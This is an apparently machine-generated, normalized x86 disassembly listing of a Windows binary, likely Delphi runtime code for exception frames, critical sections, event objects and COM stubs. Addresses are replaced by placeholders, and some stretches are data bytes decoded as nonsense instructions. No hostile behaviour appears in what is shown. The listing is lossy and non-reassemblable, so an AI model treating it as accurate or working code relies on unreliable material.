sub_436b80
jmp sub_405fd0
sub_436b87
pop ebx
mov esp ebp
pop ebp
retn
sub_436b8c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_437c88
mov eax [ rw-data ]
call sub_435658
pop ebp
retn
j_sub_405e48#2
jmp sub_405e48
j_sub_405e48#3
jmp sub_405e48
sub_436e10
jmp sub_405fd0
sub_436e17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436ef7
jmp sub_405fd0
sub_436efe
mov esp ebp
pop ebp
retn
sub_436fb6
jmp sub_405fd0
sub_436fbd
pop ecx
pop ecx
pop ebp
retn
sub_437319
jmp sub_405fd0
sub_437320
pop ebx
mov esp ebp
pop ebp
retn
sub_4375d1
jmp sub_405fd0
sub_4375d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4055f0
retn
sub_4375f4
jmp sub_405fd0
sub_437618
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_405d1c
sub_43764f
jmp sub_405d1c
sub_43768e
jmp sub_405fd0
sub_437695
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4376b7
lea eax [ ebp - 0x30 ]
mov edx 0x6
call j_sub_4068c4
retn
sub_4376b0
jmp sub_405fd0
sub_4376b7
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437786
jmp sub_405fd0
sub_43778d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4377aa
mov eax [ ebp - 0x4 ]
call sub_4358c0
retn
sub_4377a3
jmp sub_405fd0
sub_4377aa
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_437831
jmp sub_405d1c
sub_43785e
jmp sub_405fd0
sub_437865
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437870
push ecx
mov edx esp
mov ecx 0x4
call sub_435cf4
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_435658
sub_437916
jmp sub_405fd0
sub_43791d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4379fd
jmp sub_405fd0
sub_437a04
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437b3c
jmp sub_405fd0
sub_437b43
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437bbc
jmp sub_405fd0
sub_437bc3
pop ebx
pop ecx
pop ebp
retn
sub_437e2d
jmp sub_405fd0
sub_437e34
pop ecx
pop ecx
pop ebp
retn
sub_437eb5
jmp sub_405fd0
sub_437ebc
pop ecx
pop ecx
pop ebp
retn
sub_4381ce
jmp sub_405fd0
sub_4381d5
mov esp ebp
pop ebp
retn
sub_438219
jmp sub_405fd0
sub_438220
pop ebx
pop ecx
pop ebp
retn
sub_4382c0
jmp sub_405fd0
sub_4382c7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438375
jmp sub_405fd0
sub_43837c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438388
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4385e3
jmp sub_405fd0
sub_4385ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43860f
mov eax [ ebp - 0x10 ]
call sub_4055f0
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_438608
jmp sub_405fd0
sub_43860f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438634
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_43862d
jmp sub_405fd0
sub_438634
pop ebx
mov esp ebp
pop ebp
retn
sub_43885e
jmp sub_405fd0
sub_438865
pop ebx
mov esp ebp
pop ebp
retn
sub_438898
mov eax [ eax + 0x30 ]
call sub_4303e0
retn
sub_438950
call sub_438a80
retn
sub_438994
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434d60
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_438a6f
jmp sub_405fd0
sub_438a76
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_438a80
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_433ef4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_438a98
test dl dl
je r-xdata
mov dl 0x8
call sub_43af10
retn
mov dl 0x9
call sub_43af10
retn
sub_438aef
jmp sub_405fd0
sub_438af6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438b3f
jmp sub_405fd0
sub_438b46
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438bdb
jmp sub_405fd0
sub_438be2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438d83
jmp sub_405fd0
sub_438d8a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439082
jmp sub_405fd0
sub_4390c4
jmp sub_405fd0
sub_43912a
jmp sub_405fd0
sub_439131
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4393dc
mov dl 0x1
call sub_43af10
retn
sub_4393e4
xor edx edx
call sub_43af10
retn
sub_4394e3
jmp sub_405fd0
sub_4394fc
test eax eax
je r-xdata
xor eax eax
retn
test ecx ecx
je r-xdata
mov ecx [ ecx ]
mov eax ecx
mov edx [ edx ]
xchg edx eax
call sub_405894
retn
sub_43969f
jmp sub_405fd0
sub_4396a6
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439874
jmp sub_405fd0
sub_43987b
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439951
jmp sub_405fd0
sub_439958
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_439a57
jmp sub_405fd0
sub_439a5e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_439aef
jmp sub_405fd0
sub_439af6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_439caf
jmp sub_405fd0
sub_439cb6
pop ebx
pop ecx
pop ebp
retn
sub_439d42
jmp sub_405fd0
sub_439d49
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439db0
jmp sub_405fd0
sub_439db7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439e37
jmp sub_405fd0
sub_439e3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e5b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_439e54
jmp sub_405fd0
sub_439e5b
pop ebx
pop ecx
pop ebp
retn
sub_439f4a
jmp sub_405fd0
sub_439f51
pop ebx
pop ecx
pop ebp
retn
sub_43a03e
jmp sub_405fd0
sub_43a045
pop ecx
pop ecx
pop ebp
retn
sub_43a04c
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_43a155
jmp sub_405fd0
sub_43a15c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a320
jmp sub_405fd0
sub_43a39f
jmp sub_405fd0
sub_43a3a6
pop ebx
mov esp ebp
pop ebp
retn
sub_43a479
jmp sub_405fd0
sub_43a480
pop ebx
mov esp ebp
pop ebp
retn
sub_43a51a
jmp sub_405fd0
sub_43a521
pop ebx
mov esp ebp
pop ebp
retn
sub_43a581
jmp sub_405fd0
sub_43a588
mov esp ebp
pop ebp
retn
sub_43a9dd
jmp sub_405fd0
sub_43aa37
jmp sub_405fd0
sub_43aa48
jmp sub_405d1c
sub_43aaa1
jmp sub_405fd0
sub_43aaa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ab06
jmp sub_405fd0
sub_43ab0d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ab14
xor ecx ecx
call sub_439150
retn
sub_43ab1c
mov edx rw-data
mov ecx 0x4
call sub_4389ac
retn
sub_43abd9
jmp sub_405fd0
sub_43abe0
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ad0f
jmp sub_405fd0
sub_43ad16
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ae26
jmp sub_405fd0
sub_43ae2d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aefb
jmp sub_405fd0
sub_43af02
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43af08
call sub_43ad1c
retn
sub_43af48
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_4184b8
sub_43af7c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_43b008
jmp sub_405fd0
sub_43b020
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_43b02c
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_43b020
sub_43b048
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_43b17a
jmp sub_405d1c
sub_43b1b9
jmp sub_405fd0
sub_43b217
jmp sub_405fd0
sub_43b21e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b23d
push rw-data
call LeaveCriticalSection
retn
sub_43b236
jmp sub_405fd0
sub_43b23d
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b297
jmp sub_405d1c
sub_43b3d9
jmp sub_405fd0
sub_43b3e0
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43b474
inc [ rw-data ]
jne r-xdata
retn
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
call sub_43af94
call sub_43af7c
sub_43b49c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
cmp [ eax + 0x3c ] 0x0
jne r-xdata
mov dl 0x1
call sub_43b5a8
sub_43b51e
jmp sub_405fd0
sub_43b525
pop ebx
mov esp ebp
pop ebp
retn
sub_43b544
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43b558
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_43b544
call sub_43bb10
sub_43b646
jmp sub_405fd0
sub_43b64d
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b6fb
jmp sub_405fd0
sub_43b702
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43b7a8
jmp sub_405fd0
sub_43b7af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b7cc
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_43b7c5
jmp sub_405fd0
sub_43b7cc
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b865
jmp sub_405fd0
sub_43b927
jmp sub_405fd0
sub_43b92e
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43b938
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43b7d4
pop ebp
retn 0x8
sub_43baa3
jmp sub_405fd0
sub_43bac2
jmp sub_405fd0
sub_43bae9
jmp sub_405fd0
sub_43bba1
jmp sub_405fd0
sub_43bba8
pop ebx
pop ecx
pop ebp
retn
sub_43bc2d
jmp sub_405fd0
sub_43bc34
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43bcf4
jmp sub_405fd0
sub_43bd11
jmp sub_405fd0
sub_43bd18
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bdb0
jmp sub_405fd0
sub_43bdb7
pop ebx
mov esp ebp
pop ebp
retn
sub_43bdbc
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43bbac
pop ebp
retn 0x8
sub_43be68
jmp sub_405fd0
sub_43be6f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_43be74
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor eax eax
call sub_43b874
pop ebp
retn 0x8
sub_43be88
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_43bf34
call sub_43bec4
jmp r-xdata
sub_43bebc
xor edx edx
call sub_43b5a8
retn
sub_43bf12
jmp sub_405d1c
sub_43bf5c
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov [ eax + 0xd ] 0x1
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
sub_43c0b1
jmp sub_405d1c
sub_43c0b6
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c0d8
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_43c0d1
jmp sub_405fd0
sub_43c0d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c124
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43cacc
retn
sub_43c130
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_43caf8
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_43c1e0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_43c47c
sub_43c280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_43c294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_43c2a8
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_439310
retn
sub_43c2b4
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_439310
retn
sub_43c624
xor eax eax
retn
sub_43c628
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43c630
xor eax eax
retn
sub_43c634
retn
sub_43c638
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c0e0
retn
sub_43c648
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4070a8
pop esi
pop ebx
retn
sub_43c65c
mov eax [ eax + 0x4 ]
retn
sub_43c660
retn
sub_43c664
xor eax eax
retn
sub_43c668
retn
sub_43c66c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_43c678
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_43c684
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_43c690
retn
sub_43c694
xchg edx eax
call sub_436590
retn
sub_43c69c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_43c72c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40587c
pop esi
retn
sub_43c740
retn
sub_43c745
add eax 0xfffffff4
jmp r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_410fc4
retn
sub_43c74d
add [ esp + 0x4 ] 0xfffffff4
jmp sub_409d60
sub_43c757
add [ esp + 0x4 ] 0xfffffff4
jmp sub_409d88
sub_43c761
add [ esp + 0x4 ] 0xfffffff4
jmp sub_409d9c
sub_43c939
jmp sub_405fd0
sub_43c940
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cab0
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_430608
retn
sub_43caf8
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43cc24
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_43ccd0
jmp sub_405fd0
sub_43ccd7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cd08
cmp [ eax + 0x20 ] 0x0
je r-xdata
retn
mov eax [ eax + 0x20 ]
mov edx [ eax ]
call [ edx + 0x20 ]
sub_43cd18
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_43cda0
retn
sub_43ce05
jmp sub_405fd0
sub_43ce0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ceac
jmp sub_405fd0
sub_43ceb3
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cf10
retn
sub_43cf48
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_43cf60
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_43d194
mov eax [ ebx + 0x10 ]
mov si 0xfff0
call sub_40587c
pop esi
pop ebx
retn
sub_43cfa8
mov al 0x1
retn
sub_43cfac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43cfb4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x48 ]
retn
sub_43d06c
xor eax eax
retn
sub_43d070
retn
sub_43d09c
retn
sub_43d134
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43d148
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4303e0
retn
sub_43d293
jmp sub_405d1c
sub_43d298
mov ebx 0x1
call sub_406174
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_43d2fb
jmp sub_405d1c
sub_43d300
mov ebx 0x80030103
call sub_406174
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_43d37e
jmp sub_405d1c
sub_43d383
mov ebx 0x80030009
call sub_406174
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_43d3e1
jmp sub_405d1c
sub_43d3e6
mov ebx 0x8000ffff
call sub_406174
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_43d5b7
jmp sub_405fd0
sub_43d5c8
jmp sub_405d1c
sub_43d5cd
mov [ ebp - 0x4 ] 0x8000ffff
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d5f6
lea eax [ ebp + 0xc ]
call sub_409cb4
retn
sub_43d5ef
jmp sub_405fd0
sub_43d5f6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_43d604
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_43d610
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_43d61c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_43d628
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_43d697
jmp sub_405d1c
sub_43d69c
mov esi 0x8000ffff
call sub_406174
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_43d6b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_43d728
jmp sub_405fd0
sub_43d72f
mov eax [ rw-data ]
call sub_4055f0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d740
call sub_42f980
retn
sub_43d830
jmp sub_405fd0
sub_43d837
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d859
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_43d852
jmp sub_405fd0
sub_43d859
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43d87c
cmp [ eax + 0x58 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43d993
jmp sub_405fd0
sub_43d99a
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_405b5c
sub_43d9e4
jmp sub_405d1c
sub_43da44
jmp sub_405d1c
sub_43da49
cmp [ rw-data ] 0x0
je r-xdata
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call [ rw-data ]
sub_43dce4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
mov eax [ rw-data ]
call [ rw-data ]
mov al 0x1
retn
sub_43dd04
movzx ecx [ rw-data ]
xor cl 0x1
mov [ eax + 0x58 ] cl
call sub_43c694
retn
sub_43dd18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x34 ] eax
pop esi
pop ebx
retn
sub_43dd2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x3c ] eax
pop esi
pop ebx
retn
sub_43dd40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x40 ] eax
pop esi
pop ebx
retn
sub_43dd54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_43dd68
mov eax [ eax + 0x34 ]
xchg edx eax
call sub_439310
retn
sub_43dd74
mov eax [ eax + 0x3c ]
xchg edx eax
call sub_439310
retn
sub_43dd80
mov eax [ eax + 0x40 ]
xchg edx eax
call sub_439310
retn
sub_43dd8c
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_439310
retn
sub_43de58
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_43e0bd
jmp sub_405fd0
sub_43e1aa
jmp sub_405fd0
sub_43e1b1
pop ebx
pop ebp
retn
sub_43e1b4
inc [ rw-data ]
retn
sub_43e1ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e27c
pop esi
pop ebx
retn
sub_43e3ea
jmp sub_405fd0
sub_43e3f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e6bb
jmp [ edi ]
sub_43e94b
[ ecx ]
sub_43e94d
r-xdata 0xfff4
sub_43e954
push ecx
r-xdata 0xfff4
sub_43eaac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub ah 0x43
add [ ebx + ebp * 8 ] al
inc ebx
add [ eax ] ah
jmp sub_43eb02
sub_43eb3f
add [ edx ] cl
add [ eax ] eax
or ah ch
inc ebx
add [ edx ] al
hlt
sub_43eb4b
push [ eax ]
in al dx
inc ebx
add [ edx ] al
hlt
sub_43ef18
retn
sub_43ef1c
retn
sub_43f0e3
jmp sub_405fd0
sub_43f0ea
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f2ba
jmp sub_405fd0
sub_43f2c1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43f378
mov eax [ eax + 0x4 ]
push eax
call SetEvent
retn
sub_43f384
mov eax [ eax + 0x4 ]
push eax
call ResetEvent
retn
sub_43f400
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_43f40c
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_43f418
push ebx
lea ebx [ eax + 0x4 ]
push ebx
call TryEnterCriticalSection
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43f42c
mov edx [ eax ]
call [ edx ]
retn
sub_43f434
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_43f43c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x4
sub_43f44c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_43f754
pop ebp
retn 0x4
sub_43f45c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_43f768
pop ebp
retn 0x4
sub_43f46c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
call sub_43f654
neg al
sbb eax eax
pop ebp
retn 0xc
sub_43f4d1
jmp sub_405fd0
sub_43f4d8
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43f5ba
jmp sub_405fd0
sub_43f5c1
pop ebx
mov esp ebp
pop ebp
retn
sub_43f648
jmp sub_405fd0
sub_43f735
jmp sub_405fd0
sub_43f74c
and edx 0xfffffffe
mov [ eax ] edx
retn
sub_43f754
call sub_43f488
test eax eax
je r-xdata
retn
mov eax [ eax + 0x8 ]
push eax
call SetEvent
sub_43f7cf
jmp sub_405fd0
sub_43f7d6
pop ebx
mov esp ebp
pop ebp
retn
sub_43f950
push rw-data
call j_sub_40a3fe
pop ecx
pop edx
xchg [ esp ] eax
retn
j_sub_43f966
jmp [ rw-data ]
sub_43f966
push eax
push edx
push ecx
push rw-data
jmp sub_43f950
j_sub_43f97a
jmp [ rw-data ]
sub_43f97a
push eax
push edx
push ecx
push rw-data
jmp sub_43f950
j_sub_43f98e
jmp [ rw-data ]
sub_43f98e
push eax
push edx
push ecx
push rw-data
jmp sub_43f950
j_sub_43f9a2
jmp [ rw-data ]
sub_43f9a2
push eax
push edx
push ecx
push rw-data
jmp sub_43f950
sub_43fb66
jmp sub_405fd0
sub_43fb6d
pop ebp
retn
sub_43ff22
jmp sub_405fd0
sub_43ff29
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_44066c
inc [ rw-data ]
jne r-xdata
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4055f0
call sub_43f9b0
cmp [ rw-data ] 0x0
jg r-xdata
j_sub_4406ae
jmp [ rw-data ]
sub_4406ae
push eax
push edx
push ecx
push rw-data
jmp r-xdata
push rw-data
call j_sub_40a3fe
pop ecx
pop edx
xchg [ esp ] eax
retn
sub_4406bc
jmp [ rw-data ]
sub_44078f
inc esp
add [ edx ] al
hlt
sub_440797
inc esp
add [ edx ] al
hlt
sub_4409a8
mov edx [ eax ]
call [ edx + 0x8 ]
retn
sub_4409b0
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_4409c8
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
retn
sub_440a44
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4305a0
retn
sub_440a78
mov eax [ eax + 0x4 ]
call sub_4303e0
retn
sub_440c5d
add eax 0xffffffdc
jmp sub_4429a4
sub_440c65
add eax 0xffffffdc
jmp sub_4429b8
sub_440c6d
add [ esp + 0x4 ] 0xffffffdc
jmp sub_409d60
sub_440c77
add [ esp + 0x4 ] 0xffffffdc
jmp sub_409d88
sub_440c8b
add eax 0xffffffd8
jmp sub_442400
sub_440cc3
add eax 0xffffffd8
jmp sub_441d90
sub_440ccb
add eax 0xffffffd8
jmp sub_44203c
sub_440cd3
add eax 0xffffffd8
jmp sub_442148
sub_440cdb
add eax 0xffffffd8
jmp sub_442228
sub_440ce3
add eax 0xffffffd8
jmp sub_44223c
sub_440ceb
add [ esp + 0x4 ] 0xffffffd8
jmp sub_409d60
sub_440cf5
add [ esp + 0x4 ] 0xffffffd8
jmp sub_409d88
sub_440cff
add [ esp + 0x4 ] 0xffffffd8
jmp sub_409d9c
sub_440d09
add eax 0xffffffd4
jmp sub_44181c
sub_440d11
add [ esp + 0x4 ] 0xffffffd4
jmp sub_409d60
sub_440d1b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_409d88
sub_440d25
add [ esp + 0x4 ] 0xffffffd4
jmp sub_409d9c
sub_440f49
inc esp
add [ edx ] al
hlt
sub_440fae
push [ eax ]
adc al 0x44
add [ edx ] al
hlt
sub_440fb9
inc esp
add [ edx ] al
hlt
sub_441690
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_441740
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_409ccc
sub edx 0xffffffdc
sub_4418bc
jmp sub_405fd0
sub_4418c3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441a30
jmp sub_405fd0
sub_441a37
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441c0f
jmp sub_405fd0
sub_441caa
jmp sub_405fd0
sub_441cc7
jmp sub_405fd0
sub_441cec
